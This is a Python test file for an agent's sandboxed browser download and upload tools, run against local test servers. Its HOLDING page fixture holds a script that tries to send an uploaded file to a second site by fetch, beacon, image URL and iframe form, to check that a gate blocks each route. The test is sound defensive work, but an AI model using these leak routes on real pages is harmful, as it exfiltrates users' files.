"""The files of a page, on the real browsers (M13.13, ADR 0066): **the door of the downloads, the
file given by bytes, and the gate of a page that holds a file**.

Every site is a server of this test on the loopback: no file is given to a real site, nothing is
downloaded from one. On every system the empty browser; on a Mac also the browser of the profile,
on a folder of the test's.

Measured before the form, on 2026-11-10 (``.git/m13.13-reference/m13.13/h-door.txt``):

* with the door closed a download is **announced**, with its address, and nothing is written;
* a navigation that becomes a download **never commits a document** — so, after the gesture, the
  main frame committing one is «it led to a page»;
* the announcement comes **after** the gesture returned;
* the engine gives a file to an ``input`` of type ``text`` without a word — so what a file is
  given to is asked of the page.
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import stat
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from ela.domain import ExecutionStatus
from ela.infrastructure.machine.account import AccountChrome
from ela.permissions import (
    BROWSER_DOWNLOAD,
    BROWSER_DOWNLOAD_AS_YOU,
    BROWSER_READ,
    BROWSER_READ_AS_YOU,
    BROWSER_UPLOAD,
    BROWSER_UPLOAD_AS_YOU,
)
from ela.ports import (
    DOWNLOAD_GESTURE,
    BrowserFailed,
    DownloadNotStarted,
    GivenFile,
    SiteUnreachable,
    ToolStopped,
)
from ela.testing.fakes import FakeIdGenerator, FakeStop, FakeTaskPages
from ela.tools import browser_files
from ela.tools.account import AccountReadTool
from ela.tools.browser import (
    DOWNLOAD_REFUSED,
    LEFT_SITE,
    STOPPED,
    TIMEOUT,
    BrowserReadTool,
    Browsing,
)
from ela.tools.browser_files import (
    DOWNLOAD_NOT_STARTED,
    FILE_DOWNLOADED,
    AccountDownloadTool,
    AccountFileDownloadedVerifier,
    AccountUploadTool,
    AccountUploadVerifier,
    BrowserDownloadTool,
    BrowserUploadTool,
    FileDownloadedVerifier,
    UploadVerifier,
)
from ela.tools.verifiers import BROWSER_EXPECT_VISIBLE
from tests.infrastructure.machine import test_the_boundary as bounds
from tests.infrastructure.machine.test_browser import CLOCK, decision

served = bounds.served
nothing_left_behind = bounds.nothing_left_behind
judged = bounds.judged
profile = bounds.profile
browser = bounds.browser
only, until, HTML = bounds.only, bounds.until, bounds.HTML

FILE = bytes(range(256)) * 800
"""What the sites of these tests serve as a file: every byte there is, 204 800 of them."""
TEXT = b"il file della prova, con un testo neutro\n"
"""What these tests give a page: a text, because the sites of the tests keep what they receive
as one."""
BINARY = [("Content-Type", "application/octet-stream")]
ATTACHED = [*BINARY, ("Content-Disposition", 'attachment; filename="scelto-dal-sito.bin"')]
LINKS = (
    '<a id="at" href="/attach">a</a> '
    '<a id="dl" download="scelto-dal-sito.bin" href="/file.bin">d</a> '
    '<a id="pg" href="/other">p</a> <a id="out" href="{off}/attach">o</a> <p>links</p>'
)
SITE = "sito.example"


def sites(served: list[Any]) -> tuple[bounds.Recording, bounds.Recording]:
    """A site with links that download, and another one outside every boundary of these tests."""
    a, off = bounds.two(served)
    a.pages[("GET", "/links")] = (200, HTML, LINKS.format(off=off.origin))
    a.pages[("GET", "/other")] = (200, HTML, "<p>another page</p>")
    a.pages[("GET", "/file.bin")] = (200, BINARY, FILE)
    a.pages[("GET", "/attach")] = (200, ATTACHED, FILE)
    off.pages[("GET", "/attach")] = (200, ATTACHED, FILE)
    return a, off


def folder(tmp_path: Path) -> Path:
    made = tmp_path / "into"
    made.mkdir(mode=0o700)
    return made


# ----------------------------------------------------------------------------------------
# The door, open for one gesture
# ----------------------------------------------------------------------------------------


@pytest.mark.parametrize("link", ["#at", "#dl"], ids=["an attachment", "a link that downloads"])
async def test_a_click_downloads_under_a_name_the_site_did_not_choose(
    browser: Any, served: list[Any], tmp_path: Path, link: str
) -> None:
    a, _ = sites(served)
    into = folder(tmp_path)
    opened = await browser.open(a.origin + "/links", only(a), FakeStop())

    got = await browser.download(opened.page, link, FakeStop(), str(into))

    assert os.listdir(into) == [got.name], "one file, and nothing beside it"
    assert (into / got.name).read_bytes() == FILE
    assert "scelto" not in got.name and "file.bin" not in got.name
    assert await browser.text(opened.page, "p") == "links", "the page stays what it was"
    assert await browser.refused_download(opened.page) is None


async def test_a_click_that_leads_to_a_page_started_no_download(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    into = folder(tmp_path)
    opened = await browser.open(a.origin + "/links", only(a), FakeStop())

    with pytest.raises(DownloadNotStarted) as none:
        await browser.download(opened.page, "#pg", FakeStop(), str(into))

    assert none.value.left is None and os.listdir(into) == []
    assert await browser.text(opened.page, "p") == "another page"


async def test_a_click_that_leads_outside_the_boundary_downloads_nothing_and_says_where(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, off = sites(served)
    into = folder(tmp_path)
    opened = await browser.open(a.origin + "/links", only(a), FakeStop())

    with pytest.raises(DownloadNotStarted) as none:
        await browser.download(opened.page, "#out", FakeStop(), str(into))

    assert none.value.left == off.origin + "/attach"
    assert off.origin not in str(none.value), "the sentence of the error names no address"
    assert off.requests == [] and os.listdir(into) == []


async def test_an_address_that_is_the_file_is_downloaded_and_its_page_is_closed(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    into = folder(tmp_path)
    stop = FakeStop()

    got = await browser.downloaded_from(a.origin + "/file.bin", only(a), stop, str(into))

    assert os.listdir(into) == [got.name] and (into / got.name).read_bytes() == FILE
    assert stop.listened == [DOWNLOAD_GESTURE], "the point of the download, and no other"
    assert not browser._pages, "the page of the download is closed before this returns"


async def test_an_address_that_answers_a_page_is_no_download(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    into = folder(tmp_path)

    with pytest.raises(DownloadNotStarted) as none:
        await browser.downloaded_from(a.origin + "/other", only(a), FakeStop(), str(into))

    assert none.value.left is None and os.listdir(into) == [] and not browser._pages


async def test_an_address_that_sends_the_browser_elsewhere_downloads_nothing(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, off = sites(served)
    a.pages[("GET", "/away")] = (302, [("Location", off.origin + "/attach")], "")
    into = folder(tmp_path)

    with pytest.raises(DownloadNotStarted) as none:
        await browser.downloaded_from(a.origin + "/away", only(a), FakeStop(), str(into))

    assert none.value.left == off.origin + "/attach"
    assert off.requests == [] and os.listdir(into) == [] and not browser._pages


async def test_an_address_nobody_answers_at_is_unreachable(browser: Any, tmp_path: Path) -> None:
    into = folder(tmp_path)

    with pytest.raises(SiteUnreachable):
        await browser.downloaded_from(
            "http://127.0.0.1:9/file.bin", bounds.everywhere, FakeStop(), str(into)
        )

    assert os.listdir(into) == [] and not browser._pages


async def test_a_task_stopped_at_the_gesture_clicks_nothing_and_the_door_is_closed_again(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    """The tool's point: the door was open an instant, the stop is heard, and nothing is clicked.
    The click made after it, by a step that asked for no download, finds the door closed."""
    a, _ = sites(served)
    into = folder(tmp_path)
    opened = await browser.open(a.origin + "/links", only(a), FakeStop())
    stop = FakeStop(stopped=True)

    with pytest.raises(ToolStopped):
        await browser.download(opened.page, "#at", stop, str(into))
    clicked_nothing = "GET /attach" not in a.requests
    await browser.click(opened.page, "#at")
    refused = await until(lambda: browser._pages[opened.page].door.refused, "a download announced")

    assert stop.listened == [DOWNLOAD_GESTURE] and clicked_nothing
    assert refused == a.origin + "/attach" and os.listdir(into) == []


async def test_a_task_stopped_before_the_navigation_of_a_download_asks_the_site_nothing(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    into = folder(tmp_path)

    with pytest.raises(ToolStopped):
        await browser.downloaded_from(
            a.origin + "/file.bin", only(a), FakeStop(stopped=True), str(into)
        )

    assert a.requests == [] and os.listdir(into) == [] and not browser._pages


async def test_a_download_nobody_asked_for_is_announced_and_nothing_is_written(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    """The door is closed for every page and every other instant: the browser says what knocked,
    the adapter keeps its address, and no file is anywhere."""
    a, _ = sites(served)
    opened = await browser.open(a.origin + "/links", only(a), FakeStop())
    before = await browser.refused_download(opened.page)

    await browser.click(opened.page, "#at")
    await until(lambda: browser._pages[opened.page].door.refused, "a download announced")
    await browser.click(opened.page, "#dl")
    await a.arrived("GET /file.bin")

    assert before is None
    assert await browser.refused_download(opened.page) == a.origin + "/attach", "the first one"
    assert [one for one in tmp_path.rglob("*") if one.is_file()] == []


SLOW_PAGE = b'<a id="at" href="/slow.bin">s</a><p>slow</p>'
THEN_ANOTHER = b"<script>fetch('/go').then(() => { location = '/other.bin' })</script>"
"""What ``/two`` of :class:`Slow` adds to its page: a second download, started by the page itself
when the test lets ``/go`` answer."""


class Slow:
    """A site whose file comes in two halves: the first at once, the second when the test says —
    or never, when the test cuts the connection instead. Its page ``/two`` starts a second
    download, of ``/other.bin``, when the test says (:attr:`go`)."""

    def __init__(self) -> None:
        self.half_sent = threading.Event()
        self.release = threading.Event()
        self.go = threading.Event()
        self.cut = False
        slow = self

        class Handler(BaseHTTPRequestHandler):
            def answer(self, headers: list[tuple[str, str]], body: bytes) -> None:
                self.send_response(200)
                for name, value in headers:
                    self.send_header(name, value)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self) -> None:  # noqa: N802
                if self.path == "/go":
                    slow.go.wait(bounds.LONG)
                    self.answer(HTML, b"go")
                    return
                if self.path == "/other.bin":
                    self.answer(ATTACHED, FILE)
                    return
                if self.path != "/slow.bin":
                    more = THEN_ANOTHER if self.path == "/two" else b""
                    self.answer(HTML, SLOW_PAGE + more)
                    return
                self.send_response(200)
                for name, value in ATTACHED:
                    self.send_header(name, value)
                self.send_header("Content-Length", str(len(FILE)))
                self.end_headers()
                self.wfile.write(FILE[: len(FILE) // 2])
                self.wfile.flush()
                slow.half_sent.set()
                slow.release.wait(bounds.LONG)
                if not slow.cut:
                    self.wfile.write(FILE[len(FILE) // 2 :])

            def log_message(self, *args: object) -> None:
                return

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.origin = f"http://localhost:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.release.set()
        self.go.set()
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def slow(served: list[Any]) -> Slow:
    made = Slow()
    served.append(made)
    return made


async def test_a_download_that_is_cut_short_is_cancelled_and_nothing_of_it_stays(
    browser: Any, slow: Slow, tmp_path: Path
) -> None:
    """The time of the step ran out, or the task was cancelled: the download is cancelled, and
    what carries its name in the folder is taken away — the half that had arrived too."""
    into = folder(tmp_path)
    opened = await browser.open(slow.origin + "/", only(slow), FakeStop())

    downloading = asyncio.ensure_future(browser.download(opened.page, "#at", FakeStop(), str(into)))
    await until(lambda: slow.half_sent.is_set() and os.listdir(into), "half a file in the folder")
    downloading.cancel()
    with pytest.raises(asyncio.CancelledError):
        await downloading

    assert os.listdir(into) == []


async def test_a_download_the_site_breaks_off_is_said_and_nothing_of_it_stays(
    browser: Any, slow: Slow, tmp_path: Path
) -> None:
    into = folder(tmp_path)
    opened = await browser.open(slow.origin + "/", only(slow), FakeStop())

    downloading = asyncio.ensure_future(browser.download(opened.page, "#at", FakeStop(), str(into)))
    await until(slow.half_sent.is_set, "half a file sent")
    slow.cut = True
    slow.release.set()
    with pytest.raises(BrowserFailed, match="interrupted"):
        await downloading

    assert os.listdir(into) == []


async def test_while_a_file_arrives_the_door_is_closed_and_a_second_download_writes_nothing(
    browser: Any, slow: Slow, tmp_path: Path
) -> None:
    """**The door closes at the first word of progress, not at the end of the file.** The page
    starts a second download while the first is half arrived — when the test says, after the
    browser has spoken of the first and the door has been told to close —: the browser cancels
    it, and not one byte of it is in the folder at any instant. A door left open until the end
    would have it written there, under a name of the browser's own (measure (g) of M13.10).

    What the browser says of each download is heard on the door's own session, by a listener of
    this test: the fate of the second is its last word, never a guess from the folder.

    **It is the one test of the door's closing** (decision 41 C, after the red CI of ``0bc3278``):
    the one before it left the second download to a timer of its page, 30 ms after the click, and
    on a runner whose first answer came later there was one download and nothing to refuse. The
    two mutants of the door — closed at the end of the download, and never closed again — are
    caught here, on the two browsers (``.git/m13.13-reference/review-0bc3278/mutanti-41c.txt``)."""
    into = folder(tmp_path)
    opened = await browser.open(slow.origin + "/two", only(slow), FakeStop())
    door = browser._pages[opened.page].door
    said: dict[str, str] = {}
    door._session.on(
        "Browser.downloadProgress", lambda event: said.update({event["guid"]: event["state"]})
    )

    downloading = asyncio.ensure_future(browser.download(opened.page, "#at", FakeStop(), str(into)))
    await until(lambda: slow.half_sent.is_set() and door.asked in said, "a word of the first")
    first = door.asked
    if door._shutting:
        await asyncio.wait(door._shutting)
    slow.go.set()
    await until(
        lambda: [state for name, state in said.items() if name != first and state != "inProgress"],
        "the last word of the second",
    )
    while_it_arrived = os.listdir(into)
    slow.release.set()
    got = await downloading

    assert {name: state for name, state in said.items() if name != first} and all(
        state == "canceled" for name, state in said.items() if name != first
    ), said
    assert all(name.startswith(first) for name in while_it_arrived), while_it_arrived
    assert os.listdir(into) == [got.name] and (into / got.name).read_bytes() == FILE


# ----------------------------------------------------------------------------------------
# A file given by bytes, and the page that holds it
# ----------------------------------------------------------------------------------------

FORM = (
    '<form method="post" action="/send" enctype="multipart/form-data">'
    '<input id="file" name="doc" type="file"><input id="t" name="t" type="text">'
    '<button id="go">go</button></form>'
)


async def test_a_page_is_given_the_bytes_and_the_name_and_never_the_path(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    a.pages[("GET", "/form")] = (200, HTML, FORM)
    opened = await browser.open(a.origin + "/form", only(a), FakeStop())

    await browser.give(opened.page, "#file", GivenFile("da-caricare.txt", "text/plain", TEXT))
    seen = await browser._pages[opened.page].page.locator("#file").evaluate("el => el.value")
    await browser.click(opened.page, "#go")
    await a.arrived("POST /send")
    received = a.body("POST /send")

    assert 'filename="da-caricare.txt"' in received and "Content-Type: text/plain" in received
    assert TEXT.decode() in received.replace("\r\n", "\n")
    assert str(tmp_path) not in received and str(Path.home()) not in received
    assert str(Path.home()) not in str(seen), "what the page reads of the field is no path of ours"


@pytest.mark.parametrize("element", ["#t", "#go"], ids=["a text field", "a button"])
async def test_a_file_is_given_to_a_file_field_and_to_nothing_else(
    browser: Any, served: list[Any], element: str
) -> None:
    """The engine would give a file to a text field without a word (measured): the adapter
    asks the page what the element is, and gives nothing."""
    a, _ = sites(served)
    a.pages[("GET", "/form")] = (200, HTML, FORM)
    opened = await browser.open(a.origin + "/form", only(a), FakeStop())

    with pytest.raises(BrowserFailed, match="not an input of type file"):
        await browser.give(opened.page, element, GivenFile("x.txt", "text/plain", TEXT))
    await browser.click(opened.page, "#go")
    await a.arrived("POST /send")

    assert "x.txt" not in a.body("POST /send")


HOLDING = """
<img src="{off}/before.gif"><input id="file" type="file"><p>here</p>
<iframe name="inside" src="/frame"></iframe>
<script>
document.querySelector('#file').addEventListener('change', (event) => {{
  const given = event.target.files[0];
  fetch('/collect', {{method: 'POST', body: given}});
  fetch('{off}/by-fetch', {{method: 'POST', body: given, mode: 'no-cors'}})
    .then(() => {{ document.title = 'sent' }}, () => {{ document.title = 'refused' }});
  navigator.sendBeacon('{off}/by-beacon', given);
  new Image().src = '{off}/by-image.gif?name=' + encodeURIComponent(given.name);
  given.text().then((text) => {{
    const frame = window.frames['inside'].document;
    frame.querySelector('input').value = text;
    frame.querySelector('form').submit();
  }});
}});
</script>
"""
FRAME = '<form method="post" action="{off}/by-form"><input name="bytes"></form>'
ON_A_FILE = "document.querySelector('#file').addEventListener('change', (event) => {"
ON_LOAD = (
    "window.addEventListener('load', () => { "
    "const event = {target: {files: [new File(['x'], 'x.txt')]}};"
)
"""The same script, started by the loading of the page with a file the page made itself: what the
control of the roads runs on a page nobody gave anything to."""
ROADS = ("/by-fetch", "/by-beacon", "/by-image.gif", "/by-form")
"""The roads the gate is told of, by which a page could send a file to another site: a
``fetch``, a beacon, the address of an image, a form in a frame (criterion 8)."""


async def test_a_page_that_holds_a_file_asks_nothing_of_another_site(
    browser: Any, served: list[Any], judged: list[tuple[str, str, bool]]
) -> None:
    """The question 23 of M13.10, decided (a). Before the file the page loads from another site,
    as every page does (ADR 0064 §1); from the instant it is given a file, what it sends or loads
    there fails, **by every road the gate is told of** — and what it sends to its own site
    arrives."""
    a, off = sites(served)
    a.pages[("GET", "/holding")] = (200, HTML, HOLDING.format(off=off.origin))
    a.pages[("GET", "/frame")] = (200, HTML, FRAME.format(off=off.origin))
    a.pages[("POST", "/collect")] = (200, HTML, "ok")
    off.pages[("GET", "/before.gif")] = (200, bounds.GIF, bounds.PIXEL)
    opened = await browser.open(a.origin + "/holding", only(a), FakeStop())
    await off.arrived("GET /before.gif")

    await browser.give(opened.page, "#file", GivenFile("da-caricare.txt", "text/plain", TEXT))
    await a.arrived("POST /collect")
    for road in ROADS:
        await bounds.decided(judged, off.origin + road, leaves=False)
    shown = await browser.text(opened.page, "p")

    assert shown == "here", "the page is where it was, and is read as before"
    assert a.body("POST /collect") == TEXT.decode()
    assert off.requests == ["GET /before.gif"], "nothing of the file, by any road"
    assert await browser.left(opened.page) is None, "no navigation was refused: the page stayed"


async def test_without_a_file_the_same_page_reaches_the_other_site_by_those_roads(
    browser: Any, served: list[Any], judged: list[tuple[str, str, bool]]
) -> None:
    """The control of the test above: the roads are roads. The same script, on a page that was
    given nothing, is let go by the gate — what closes them is the file, not the page."""
    a, off = sites(served)
    page = HOLDING.format(off=off.origin).replace(ON_A_FILE, ON_LOAD)
    assert ON_LOAD in page, "the script of this page is the one of the page that holds a file"
    a.pages[("GET", "/holding")] = (200, HTML, page)
    a.pages[("GET", "/frame")] = (200, HTML, FRAME.format(off=off.origin))
    a.pages[("POST", "/collect")] = (200, HTML, "ok")
    off.pages[("GET", "/before.gif")] = (200, bounds.GIF, bounds.PIXEL)

    await browser.open(a.origin + "/holding", only(a), FakeStop())

    for road in ROADS:
        await bounds.decided(judged, off.origin + road, leaves=True)


# ----------------------------------------------------------------------------------------
# The tools, on the real browsers
# ----------------------------------------------------------------------------------------


def carrying(data: bytes, *folders: Path) -> set[Path]:
    """Every file under ``folders`` that holds ``data`` — its beginning and a piece of its middle,
    anywhere in the file, whatever its name."""
    marks = (data[:4096], data[len(data) // 2 : len(data) // 2 + 4096])
    found: set[Path] = set()
    for folder in folders:
        for one in folder.rglob("*"):
            if one.is_file() and not one.is_symlink():
                held = one.read_bytes()
                if all(mark in held for mark in marks):
                    found.add(one.resolve())
    return found


def allowed_to_carry(browser: Any, target: Path) -> set[Path]:
    """Where the bytes of a download may be when it is over: the target — and, on the browser of
    the profile, the copy its cache keeps in the folder of the profile (declared, ADR 0066)."""
    kept = {target.resolve()}
    if isinstance(browser, AccountChrome):
        profile = Path(os.environ["TMPDIR"]) / "profile"
        kept |= {one for one in carrying(FILE, profile)}
    return kept


def browsing(origin: str, seconds: int = 30) -> Browsing:
    return Browsing(sites=(SITE,), origin=lambda name: origin, timeout_seconds=seconds)


def root(tmp_path: Path) -> Path:
    made = tmp_path / "root"
    (made / "ELA").mkdir(parents=True)
    return made


def of(browser: Any, empty: Any, with_the_profile: Any) -> Any:
    """The class of the browser these tests were handed: a tool, a verifier, a capability."""
    return with_the_profile if isinstance(browser, AccountChrome) else empty


async def run(tool: Any, capability: str, arguments: dict[str, Any]) -> Any:
    prospect = await tool.prospect(arguments)
    assert prospect.refusal is None, prospect.refusal
    return await tool.execute(decision(capability), arguments, FakeStop(), prospect.named or {})


@pytest.mark.parametrize("click", [None, "#at"], ids=["the address is the file", "a click"])
async def test_a_download_ends_in_the_file_the_plan_named_with_600_and_its_verifier_finds_it(
    browser: Any, served: list[Any], tmp_path: Path, click: str | None
) -> None:
    a, _ = sites(served)
    under = root(tmp_path)
    tool = of(browser, BrowserDownloadTool, AccountDownloadTool)(
        under,
        browsing(a.origin),
        browser,
        CLOCK,
        FakeIdGenerator(),
        pages=FakeTaskPages(),
        protected={},
    )
    capability = of(browser, BROWSER_DOWNLOAD, BROWSER_DOWNLOAD_AS_YOU)
    arguments: dict[str, Any] = {
        "site": SITE,
        "path": "/file.bin" if click is None else "/links",
        "file": "ELA/prova/scaricato.bin",
        "overwrite": False,
        "purpose": "la prova",
        **({} if click is None else {"click": click}),
    }

    result = await run(tool, capability, arguments)
    verifier = of(browser, FileDownloadedVerifier, AccountFileDownloadedVerifier)(under)
    failures = await verifier.verify([FILE_DOWNLOADED], arguments, result)

    target = under / "ELA" / "prova" / "scaricato.bin"
    assert result.status is ExecutionStatus.SUCCEEDED, result.error
    assert target.read_bytes() == FILE and stat.S_IMODE(target.stat().st_mode) == 0o600
    assert os.listdir(target.parent) == ["scaricato.bin"], "the browser's own name is gone"
    assert result.output["size"] == len(FILE)
    assert result.output["digest"] == hashlib.sha256(FILE).hexdigest()
    assert failures == () and not browser._pages, "its verifier reads the disk: no page is kept"
    assert carrying(FILE, tmp_path, Path(os.environ["TMPDIR"])) == allowed_to_carry(
        browser, target
    ), "criterion 2: the bytes are in the target — and, on the profile, in the profile's folder"


async def test_a_download_from_a_page_instead_of_a_file_writes_nothing_and_says_so(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, off = sites(served)
    a.pages[("GET", "/away")] = (302, [("Location", off.origin + "/attach")], "")
    under = root(tmp_path)
    tool = of(browser, BrowserDownloadTool, AccountDownloadTool)(
        under,
        browsing(a.origin),
        browser,
        CLOCK,
        FakeIdGenerator(),
        pages=FakeTaskPages(),
        protected={},
    )
    capability = of(browser, BROWSER_DOWNLOAD, BROWSER_DOWNLOAD_AS_YOU)
    arguments = {"site": SITE, "file": "ELA/x.bin", "overwrite": False, "purpose": "la prova"}

    a_page = await run(tool, capability, {**arguments, "path": "/other"})
    elsewhere = await run(tool, capability, {**arguments, "path": "/away"})

    assert a_page.error is not None and a_page.error.code == DOWNLOAD_NOT_STARTED
    assert elsewhere.error is not None and elsewhere.error.code == LEFT_SITE
    assert off.origin in elsewhere.error.message and "/attach" not in elsewhere.error.message
    assert off.requests == [] and os.listdir(under / "ELA") == []


class Cut:
    """The time of a step as the tool asks it of ``asyncio``, kept — and run out when the test says
    (the census of decision 47, after the red CI of ``0bc3278``). Five seconds of the step covered
    the launch of the browser too, which on a runner can take that long: the step was cut before
    the file had begun to arrive, and the test said nothing of what it is about."""

    def __init__(self) -> None:
        self.kept: list[asyncio.Timeout] = []

    def timeout(self, delay: float | None) -> asyncio.Timeout:
        made = asyncio.timeout(None)
        self.kept.append(made)
        return made

    def asyncio(self) -> SimpleNamespace:
        """``asyncio`` as the tool's module sees it: the same, but for its time."""
        names = {name: getattr(asyncio, name) for name in dir(asyncio) if not name.startswith("_")}
        return SimpleNamespace(**{**names, "timeout": self.timeout})


async def test_a_download_the_time_of_its_step_cuts_leaves_nothing_in_the_folder(
    browser: Any, slow: Slow, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The time of the step runs out **when half the file is in the folder**: an event, never a
    number of seconds that a launch of the browser can outlast."""
    under = root(tmp_path)
    tool = of(browser, BrowserDownloadTool, AccountDownloadTool)(
        under,
        browsing(slow.origin),
        browser,
        CLOCK,
        FakeIdGenerator(),
        pages=FakeTaskPages(),
        protected={},
    )
    capability = of(browser, BROWSER_DOWNLOAD, BROWSER_DOWNLOAD_AS_YOU)
    arguments = {
        "site": SITE,
        "path": "/slow.bin",
        "file": "ELA/lento.bin",
        "overwrite": False,
        "purpose": "la prova",
    }
    cut = Cut()
    monkeypatch.setattr(browser_files, "asyncio", cut.asyncio())

    running = asyncio.ensure_future(run(tool, capability, arguments))
    await until(
        lambda: slow.half_sent.is_set() and os.listdir(under / "ELA"), "half a file in the folder"
    )
    (kept,) = cut.kept
    kept.reschedule(asyncio.get_running_loop().time())
    result = await running

    assert result.error is not None and result.error.code == TIMEOUT
    assert result.output["gestures"] == 1, "the gesture counts as made once the browser has it"
    assert os.listdir(under / "ELA") == [] and not browser._pages


async def test_a_task_stopped_while_a_real_download_arrives_leaves_nothing_in_the_folder(
    browser: Any, slow: Slow, tmp_path: Path
) -> None:
    """Criterion 5, with the stop of the task and not the time: heard while half the file is in
    the folder, the download is cancelled and what the browser had written is taken away."""
    under = root(tmp_path)
    tool = of(browser, BrowserDownloadTool, AccountDownloadTool)(
        under,
        browsing(slow.origin),
        browser,
        CLOCK,
        FakeIdGenerator(),
        pages=FakeTaskPages(),
        protected={},
    )
    capability = of(browser, BROWSER_DOWNLOAD, BROWSER_DOWNLOAD_AS_YOU)
    arguments = {
        "site": SITE,
        "path": "/slow.bin",
        "file": "ELA/lento.bin",
        "overwrite": False,
        "purpose": "la prova",
    }
    stop = FakeStop()

    running = asyncio.ensure_future(tool.execute(decision(capability), arguments, stop))
    await until(
        lambda: slow.half_sent.is_set() and os.listdir(under / "ELA"), "half a file in the folder"
    )
    stop.event.set()
    result = await running

    assert result.error is not None and result.error.code == STOPPED
    assert result.output["gestures"] == 1
    assert os.listdir(under / "ELA") == [] and not browser._pages


async def test_the_site_receives_the_bytes_ela_read_whatever_the_disk_holds_afterwards(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    """Criterion 13: bytes, not a path. The file on the disk is changed **after it was given to
    the page and before the click** — given by its path, the new one would leave (measure (d) of
    M13.10) —, and the site receives what the question named."""
    a, _ = sites(served)
    a.pages[("GET", "/form")] = (200, HTML, FORM)
    a.pages[("POST", "/send")] = (200, HTML, "<p>Ricevuto, grazie</p>")
    under = root(tmp_path)
    file = under / "ELA" / "da-caricare.txt"
    file.write_bytes(TEXT)
    tool = of(browser, BrowserUploadTool, AccountUploadTool)(
        under, browsing(a.origin), browser, CLOCK, FakeIdGenerator(), pages=FakeTaskPages()
    )
    capability = of(browser, BROWSER_UPLOAD, BROWSER_UPLOAD_AS_YOU)
    arguments = {
        "site": SITE,
        "path": "/form",
        "file": "ELA/da-caricare.txt",
        "file_field": "#file",
        "fill": [["#t", "una nota"]],
        "click": "#go",
        "expect_text": "Ricevuto, grazie",
        "purpose": "la prova",
    }
    filling = browser.fill

    async def changed_first(page: str, selector: str, value: str) -> None:
        file.write_bytes(b"UN ALTRO CONTENUTO, scritto dopo che il file era stato dato\n")
        await filling(page, selector, value)

    browser.fill = changed_first
    try:
        result = await run(tool, capability, arguments)
    finally:
        del browser.fill
    received = a.body("POST /send")

    assert result.status is ExecutionStatus.SUCCEEDED, result.error
    assert TEXT.decode() in received.replace("\r\n", "\n")
    assert "UN ALTRO CONTENUTO" not in received


async def test_an_upload_gives_the_file_and_clicks_and_its_verifier_sees_the_page(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    a, _ = sites(served)
    a.pages[("GET", "/form")] = (200, HTML, FORM)
    a.pages[("POST", "/send")] = (200, HTML, "<p>Ricevuto, grazie</p>")
    under = root(tmp_path)
    (under / "ELA" / "da-caricare.txt").write_bytes(TEXT)
    tool = of(browser, BrowserUploadTool, AccountUploadTool)(
        under, browsing(a.origin), browser, CLOCK, FakeIdGenerator(), pages=FakeTaskPages()
    )
    capability = of(browser, BROWSER_UPLOAD, BROWSER_UPLOAD_AS_YOU)
    arguments = {
        "site": SITE,
        "path": "/form",
        "file": "ELA/da-caricare.txt",
        "file_field": "#file",
        "fill": [["#t", "una nota"]],
        "click": "#go",
        "expect_text": "Ricevuto, grazie",
        "purpose": "la prova",
    }

    result = await run(tool, capability, arguments)
    verifier = of(browser, UploadVerifier, AccountUploadVerifier)(browser, bounds.LONG)
    failures = await verifier.verify([BROWSER_EXPECT_VISIBLE], arguments, result)
    received = a.body("POST /send")

    assert result.status is ExecutionStatus.SUCCEEDED, result.error
    assert result.output["gestures"] == 3 and failures == ()
    assert 'filename="da-caricare.txt"' in received and "una nota" in received
    assert str(under) not in received


AS_THE_SITE_OF_THE_PROOF = """
<p id="statusmessage"></p><input id="fileinput" type="file">
<script>
const status = document.querySelector('#statusmessage');
document.querySelector('#fileinput').addEventListener('change', (event) => {
  const form = new FormData();
  form.append('filename', event.target.files[0]);
  fetch('/uploads/fileprocessor', {method: 'POST', body: form})
    .then((answer) => { status.textContent = answer.ok ? 'Upload successful!' : 'Upload failed.' });
  setTimeout(() => { status.textContent = '' }, 4000);
});
</script>
"""
"""The two oddities of the page Tommaso chose for the proof, read without entering (answer 22 of
the review of M13.13's SPEC), rebuilt here **as its script has them**
(``.git/m13.13-reference/m13.13/eviltester-final-page.txt``): the script sends the file with
``fetch`` as soon as the field has it, and «Upload successful!» is taken away **four seconds after
the file was given** — the clock starts with the gesture, not with the site's answer."""


async def test_a_page_that_uploads_when_the_file_is_given_and_shows_its_text_for_four_seconds(
    browser: Any, served: list[Any], tmp_path: Path
) -> None:
    """Answer 22. The bytes leave at the first gesture, as measure (d) of M13.10 says; ``click``
    is not needed, and the schema lets it be absent; **and the verifier sees a text that lasts
    four seconds** — looked at right after the step, as the executor looks."""
    a, _ = sites(served)
    a.pages[("GET", "/upload-page")] = (200, HTML, AS_THE_SITE_OF_THE_PROOF)
    a.pages[("POST", "/uploads/fileprocessor")] = (200, HTML, "ok")
    under = root(tmp_path)
    (under / "ELA" / "da-caricare.txt").write_bytes(TEXT)
    tool = of(browser, BrowserUploadTool, AccountUploadTool)(
        under, browsing(a.origin), browser, CLOCK, FakeIdGenerator(), pages=FakeTaskPages()
    )
    capability = of(browser, BROWSER_UPLOAD, BROWSER_UPLOAD_AS_YOU)
    arguments = {
        "site": SITE,
        "path": "/upload-page",
        "file": "ELA/da-caricare.txt",
        "file_field": "#fileinput",
        "expect_text": "Upload successful!",
        "purpose": "la prova",
    }

    result = await run(tool, capability, arguments)
    verifier = of(browser, UploadVerifier, AccountUploadVerifier)(browser, 5.0)
    failures = await verifier.verify([BROWSER_EXPECT_VISIBLE], arguments, result)

